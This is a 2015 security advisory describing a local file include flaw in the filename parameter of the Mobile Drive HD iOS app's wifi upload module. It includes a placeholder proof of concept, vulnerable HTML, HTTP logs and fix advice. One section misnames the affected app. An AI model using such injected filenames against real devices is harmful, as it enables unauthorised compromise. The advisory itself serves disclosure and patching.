@@ -1,0 +1,231 @@
+Document Title:
+===============
+Mobile Drive HD v1.8 - File Include Web Vulnerability
+
+
+References (Source):
+====================
+http://www.vulnerability-lab.com/get_content.php?id=1446
+
+
+Release Date:
+=============
+2015-03-11
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+1446
+
+
+Common Vulnerability Scoring System:
+====================================
+6.4
+
+
+Product & Service Introduction:
+===============================
+Mobile Drive is the ideal app for anyone who transfer documents between PC, iPad and Cloud. Mobile Drive allows you to manage 
+documents and organize them. You can quickly upload and download documents via email and the popular cloud storage services.
+
+(Copy of the Vendor Homepage: https://itunes.apple.com/en/app/mobile-drive-hd-document-cloud/id626102554 )
+
+
+Abstract Advisory Information:
+==============================
+The Vulnerability Laboratory Core Research Team discovered file include web vulnerability in the Mobile Drive HD v1.8 iOS mobile application.
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2015-03-11: Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Affected Product(s):
+====================
+Keke Cai
+Product: Mobile Drive HD- iOS Mobile Web Application 1.8
+
+
+Exploitation Technique:
+=======================
+Local
+
+
+Severity Level:
+===============
+High
+
+
+Technical Details & Description:
+================================
+A local file include web vulnerability has been discovered in the official USB Disk Free - File Manager & Transfer v1.0 iOS mobile application.
+The local file include web vulnerability allows remote attackers to unauthorized include local file/path requests or system specific path commands 
+to compromise the mobile web-application.
+
+The web vulnerability is located in the `filename` value of the `upload` module. Remote attackers are able to inject own files with malicious 
+`filename` values in the `upload` POST method request to compromise the mobile web-application. The local file/path include execution occcurs in 
+the index file dir listing of the wifi interface. The attacker is able to inject the local file include request by usage of the `wifi interface` 
+in connection with the vulnerable upload POST method request. 
+
+Remote attackers are also able to exploit the filename issue in combination with persistent injected script codes to execute different malicious 
+attack requests. The attack vector is located on the application-side of the wifi service and the request method to inject is POST. 
+
+The security risk of the local file include web vulnerability is estimated as high with a cvss (common vulnerability scoring system) count of 6.4. 
+Exploitation of the local file include web vulnerability requires no user interaction or privileged web-application user account. Successful exploitation 
+of the local file include web vulnerability results in mobile application compromise or connected device component compromise.
+
+Request Method(s):
+				[+] [POST]
+
+Vulnerable Module(s):
+				[+] Upload
+
+Vulnerable Parameter(s):
+				[+] filename
+
+Affected Module(s):
+				[+] Index File Dir Listing (http://localhost:8080/)
+
+
+Proof of Concept (PoC):
+=======================
+The local file include web vulnerability can be exploited by local attackers without privileged application user accounts or user interaction.
+For security demonstration or to reproduce the security vulnerability follow the provided information and steps below to continue.
+
+PoC: 
+http://localhost:8080/files/%3C./[LOCAL FILE INCLUDE VULNERABILITY!]%3E/2.png
+
+
+PoC: Vulnerable Source
+<tr class="shadow"><td><a href="/files/%3Ciframe%3E2.png" class="file">[LOCAL FILE INCLUDE VULNERABILITY!]%3E/2.png</a></td><td class='del'>
+<form action='/files/%3C[LOCAL FILE INCLUDE VULNERABILITY!]%3E/2.png' method='post'><input name='_method' value='delete' type='hidden'/>
+<input name="commit" type="submit" value="Delete" class='button' /></td></tr></tbody></table></iframe></a></td></tr></tbody>
+</table>
+
+
+--- PoC Session Logs [POST] ---
+Status: 302[Found]
+POST http://localhost:8080/files Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Größe des Inhalts[67] Mime Type[text/html]
+   Request Header:
+      Host[localhost:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      Referer[http://localhost:8080/]
+      Connection[keep-alive]
+   POST-Daten:
+      POST_DATA[-----------------------------21144193462
+Content-Disposition: form-data; name="newfile"; filename="[LOCAL FILE INCLUDE VULNERABILITY!]%3E/2.png"
+Content-Type: image/png
+-
+Status: 200[OK]
+GET http://localhost:8080/ Load Flags[LOAD_DOCUMENT_URI  LOAD_REPLACE  LOAD_INITIAL_DOCUMENT_URI  ] Größe des Inhalts[2739] Mime Type[application/x-unknown-content-type]
+   Request Header:
+      Host[localhost:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      Referer[http://localhost:8080/]
+      Connection[keep-alive]
+   Response Header:
+      Accept-Ranges[bytes]
+      Content-Length[2739]
+      Date[Mo., 09 März 2015 14:24:12 GMT]
+-
+Status: 200[OK]
+GET http://localhost:8080/jquery.js Load Flags[LOAD_NORMAL] Größe des Inhalts[55774] Mime Type[application/x-unknown-content-type]
+   Request Header:
+      Host[localhost:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0]
+      Accept[*/*]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      Referer[http://localhost:8080/]
+      Connection[keep-alive]
+   Response Header:
+      Accept-Ranges[bytes]
+      Content-Length[55774]
+      Date[Mo., 09 März 2015 14:24:12 GMT]
+-
+Status: 200[OK]
+GET http://localhost:8080/files?Mon%20Mar%2009%202015%2015:26:02%20GMT+0100 Load Flags[LOAD_BACKGROUND  ] Größe des Inhalts[62] Mime Type[text/plain]
+   Request Header:
+      Host[localhost:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0]
+      Accept[application/json, text/javascript, */*]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      X-Requested-With[XMLHttpRequest]
+      Referer[http://localhost:8080/]
+      Connection[keep-alive]
+   Response Header:
+      Accept-Ranges[bytes]
+      Content-Length[62]
+      Cache-Control[private, max-age=0, must-revalidate]
+      Content-Type[text/plain; charset=utf-8]
+      Date[Mo., 09 März 2015 14:24:13 GMT]
+
+
+Reference(s):
+http://localhost:8080/files/
+http://localhost:8080/jquery.js
+
+
+Solution - Fix & Patch:
+=======================
+The vulnerability can be patched by a secure validation of the filename value in the upload POST method request. Restrict the filename input and 
+disallow special chars. Ensure that not multiple file extensions are loaded in the filename value to prevent arbitrary file upload attacks.
+Encode the output in the file dir index list with the vulnerable name value to prevent an application-side injection attacks.
+
+
+Security Risk:
+==============
+The security risk of the local file include web vulnerability in the upload POST method request is estimated as high. (CVSS 6.4)
+
+
+Credits & Authors:
+==================
+Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@evolution-sec.com) [www.vulnerability-lab.com]
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
+or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
+in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
+or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for 
+consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses, 
+policies, deface websites, hack into databases or trade with fraud/stolen material.
+
+Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com
+Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       		- admin@evolution-sec.com
+Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact
+Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab
+Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/
+
+Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to 
+electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
+Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website 
+is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact 
+(admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.
+
+				Copyright © 2015 | Vulnerability Laboratory - [Evolution Security GmbH]™
+
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
+SERVICE: www.vulnerability-lab.com
+CONTACT: research@vulnerability-lab.com
+PGP KEY: http://www.vulnerability-lab.com/keys/admin@vulnerability-lab.com%280x198E9928%29.txt
+
+
